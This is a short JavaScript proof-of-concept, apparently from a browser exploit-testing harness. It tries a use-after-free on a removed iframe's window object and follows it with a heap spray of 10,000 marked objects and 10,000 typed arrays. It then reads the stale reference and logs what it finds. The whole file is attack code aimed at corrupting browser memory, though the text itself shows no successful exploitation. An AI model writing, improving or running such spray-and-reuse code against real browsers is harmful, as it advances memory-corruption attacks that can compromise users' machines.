(() => {
  log("[*] uaf_memory_spray — attempt to reuse memory around a freed WindowProxy", "info");

  const HTML_PLD = `<body><script>window.addEventListener("message",e=>{});</script></body>`;
  let leak = null;

  const iframe = document.createElement("iframe");
  iframe.setAttribute("srcdoc", HTML_PLD);
  document.body.appendChild(iframe);

  setTimeout(() => {
    leak = iframe.contentWindow;  // 💣 UAF reference
    document.body.removeChild(iframe);
    log("[+] iframe removed — leak retained", "info");

    // 🧱 JavaScript object spray
    const sprayObjs = [];
    for (let i = 0; i < 10000; i++) {
      sprayObjs.push({
        a: 0x41414141,
        b: "UAF_MARKER_" + i,
        c: function () { return i; }
      });
    }

    // 🧱 Memory buffer spray
    const buffers = [];
    for (let i = 0; i < 10000; i++) {
      const buf = new Float64Array(8);
      buf[0] = 13.37;
      buf[1] = 9007199254740991;
      buffers.push(buf);
    }

    // 🔍 Access leak reference
    try {
      const href = leak?.location?.href;
      log(`[✔] leak.location.href: ${href}`, "success");
    } catch (e) {
      log(`[!] Post-UAF exception: ${e.message}`, "error");
    }

    // 🔍 Check sprayed content
    const sample = sprayObjs[Math.floor(Math.random() * sprayObjs.length)];
    log(`[+] spray sample: a=${sample.a}, b=${sample.b}`, "info");

    log("[✓] End of structured spray around UAF", "info");

  }, 300);
})();
